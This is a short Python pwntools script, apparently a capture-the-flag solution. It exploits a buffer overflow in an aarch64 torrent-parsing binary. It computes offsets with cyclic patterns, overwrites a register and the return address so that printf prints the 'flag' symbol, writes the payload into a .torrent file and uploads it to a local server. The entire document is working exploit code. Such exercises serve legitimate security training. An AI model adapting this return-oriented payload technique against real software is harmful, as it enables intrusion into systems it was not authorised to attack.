from pwn import *
import string
import requests

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
context.arch = 'aarch64'

exe = ELF('./handout/parse')

x0_offset = cyclic_find(b"AFAAAGAA",alphabet=string.ascii_uppercase.encode())
ret_offset = cyclic_find(b"EAAAFAAA",alphabet=string.ascii_uppercase.encode())

payload = b""
payload += b"0:"
payload += cyclic(x0_offset,alphabet=string.ascii_uppercase.encode())+p64(exe.symbols["flag"])
payload += cyclic(ret_offset,alphabet=string.ascii_uppercase.encode())+p64(exe.plt["printf"])

print(payload)
print(len(payload))

with open("payload.torrent", "wb") as f:
    f.write(payload)


url = "http://localhost:50000"
flag = requests.post(url, files={"torrentFile": open("payload.torrent", "rb")}).text
print(flag)